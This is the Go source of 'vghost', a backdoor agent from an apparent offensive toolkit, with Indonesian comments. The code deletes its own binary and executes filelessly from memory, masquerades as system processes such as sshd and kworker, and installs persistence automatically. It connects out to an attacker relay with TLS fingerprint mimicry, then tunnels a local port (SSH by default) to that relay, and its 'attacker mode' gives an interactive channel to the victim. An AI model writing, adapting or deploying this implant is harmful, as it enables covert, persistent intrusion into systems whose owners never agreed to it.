package main

import (
	"context"
	"flag"
	"fmt"
	"io"
	"log"
	"net"
	"os"
	"time"

	"github.com/blackopsbos/svenom/pkg/evasion"
	"github.com/blackopsbos/svenom/pkg/masquerade"
	"github.com/blackopsbos/svenom/pkg/memfd"
	"github.com/blackopsbos/svenom/pkg/persistence"
)

var (
	secretKey  = flag.String("Sk", "", "Secret key (jika tidak pakai embedded)")
	domain     = flag.String("d", "", "Domain/IP relay server (jika tidak pakai embedded)")
	relayPort  = flag.String("P", "443", "Port relay server")
	localPort  = flag.String("p", "22", "Port lokal yang akan diekspos")
	mimic      = flag.String("mimic", "chrome", "Profil TLS mimicry")
	noTLS      = flag.Bool("no-tls", false, "Matikan TLS")
	connect    = flag.Bool("connect", false, "Mode attacker")
	retryMax   = flag.Int("retry", 0, "Maks percobaan (0=unlimited)")
	retryDelay = flag.Int("retry-delay", 5, "Delay antar percobaan (detik)")
	help       = flag.Bool("h", false, "Tampilkan bantuan")
)

// Placeholder yang akan diganti oleh server installer
var (
	embeddedSecret = "SSSSSSSSSSSSSSSSSSSSSSSSSSSSSSSS"
	embeddedDomain = "DDDDDDDDDDDDDDDDDDDDDDDDDDDDDDDD"
)

func printHelp() {
	fmt.Println(`
vghost - Ghost Agent (Target & Attacker)

Jika binary sudah di-patch, jalankan tanpa argumen:
  ./vghost

Mode Target (expose port lokal ke relay):
  vghost --Sk <secret> -d <domain> [-p port_lokal]

Mode Attacker (langsung terhubung ke target via relay):
  vghost --Sk <secret> -d <domain> --connect

Opsi:`)
	flag.PrintDefaults()
	fmt.Println()
}

func getSecretAndDomain() (string, string) {
	s := *secretKey
	d := *domain
	if s == "" {
		s = embeddedSecret
	}
	if d == "" {
		d = embeddedDomain
	}
	return s, d
}

func main() {
	flag.Parse()

	if *help {
		printHelp()
		return
	}

	secret, domainVal := getSecretAndDomain()

	if secret == "" || domainVal == "" {
		fmt.Fprintf(os.Stderr, "Error: Secret dan domain harus diisi (via flag atau embedded).\n")
		os.Exit(1)
	}

	// Fileless execution
	self, err := os.ReadFile(os.Args[0])
	if err == nil {
		os.Remove(os.Args[0])
		if err := memfd.ExecuteInMemory(self, os.Args, os.Environ()); err != nil {
			log.Printf("memfd fallback: %v", err)
		} else {
			return
		}
	}

	masks := []string{"nginx", "sshd", "systemd-journal", "kworker/u8:1"}
	maskName := masks[time.Now().Unix()%int64(len(masks))]
	masquerade.DisguiseAs(maskName, fmt.Sprintf("/usr/sbin/%s --daemon", maskName))

	// Auto-persistence
	if err := persistence.Install(secret, domainVal, *relayPort, "8080"); err != nil {
		log.Printf("Info: persistence gagal: %v", err)
	} else {
		log.Println("Persistence terpasang otomatis.")
	}

	evMgr := evasion.NewManager(evasion.BrowserProfile(*mimic))
	addr := net.JoinHostPort(domainVal, *relayPort)
	retries := 0

	for {
		log.Printf("Menghubungkan ke relay %s (percobaan %d)", addr, retries+1)

		var conn net.Conn
		if *noTLS {
			conn, err = evMgr.DialDirect(context.Background(), "tcp", addr)
		} else {
			conn, err = evMgr.DialContext(context.Background(), "tcp", addr)
		}
		if err != nil {
			log.Printf("Gagal: %v", err)
			retries++
			if *retryMax > 0 && retries >= *retryMax {
				log.Fatal("Batas maksimum percobaan.")
			}
			time.Sleep(time.Duration(*retryDelay) * time.Second)
			continue
		}

		fmt.Fprintf(conn, "%s\n", secret)
		log.Printf("Terhubung ke relay, menunggu pasangan...")

		if *connect {
			log.Printf("Mode Attacker aktif: gunakan Ctrl+C untuk keluar.")
			go io.Copy(conn, os.Stdin)
			io.Copy(os.Stdout, conn)
			conn.Close()
			log.Printf("Koneksi terputus.")
			return
		} else {
			localConn, err := net.DialTimeout("tcp", net.JoinHostPort("127.0.0.1", *localPort), 10*time.Second)
			if err != nil {
				log.Printf("Layanan lokal port %s tidak dapat dijangkau: %v", *localPort, err)
				conn.Close()
				time.Sleep(time.Duration(*retryDelay) * time.Second)
				continue
			}
			go io.Copy(localConn, conn)
			io.Copy(conn, localConn)
			localConn.Close()
			conn.Close()
			log.Printf("Koneksi terputus, mencoba lagi...")
			retries = 0
			time.Sleep(1 * time.Second)
		}
	}
}